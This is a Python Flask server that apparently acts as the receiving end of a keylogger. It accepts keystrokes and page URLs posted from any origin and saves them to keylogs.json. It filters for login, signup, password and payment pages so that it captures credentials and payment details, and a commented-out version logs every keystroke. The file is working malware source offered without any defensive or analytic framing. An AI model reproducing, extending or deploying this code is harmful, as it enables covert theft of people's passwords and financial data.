from flask import Flask, request, jsonify
import logging
from waitress import serve
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)

KEYWORDS = ['login', 'signup', 'account', 'payment', 'password', 'signin']

class JSONFormatter(logging.Formatter):
    def format(self, record):
        log_message = {
            'key': record.getMessage().split(",")[0].strip(),
            'url': record.getMessage().split(",")[1].strip() if "," in record.getMessage() else None
        }
        return json.dumps(log_message)
    
def should_log(url):
    return any(keyword in url.lower() for keyword in KEYWORDS)

handler = logging.FileHandler('keylogs.json')
formatter = JSONFormatter()
handler.setFormatter(formatter)
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.DEBUG)

@app.route('/logs', methods=['POST'])
def log_key():
    try:
        data = request.json
        key = data.get('key', '')
        url = data.get('url', '')
        
        if should_log(url):
            # Log in JSON format the formater is automatically
            logging.info(f"Key: {key}, URL: {url}")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logging.error(f"Error logging key: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=5000)








# to do logging in txt file
# logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(message)s")

# @app.route('/logs', methods=['POST'])
# def log_key():
#     try:
#         data = request.json
#         key = data.get('key')
#         url = data.get('url')
#         logging.info(f"Key: {key}, URL: {url}")
#         return jsonify({"status": "success"}), 200
#     except Exception as e:
#         logging.error(f"Error logging key: {str(e)}")
#         return jsonify({"status": "error", "message": str(e)}), 500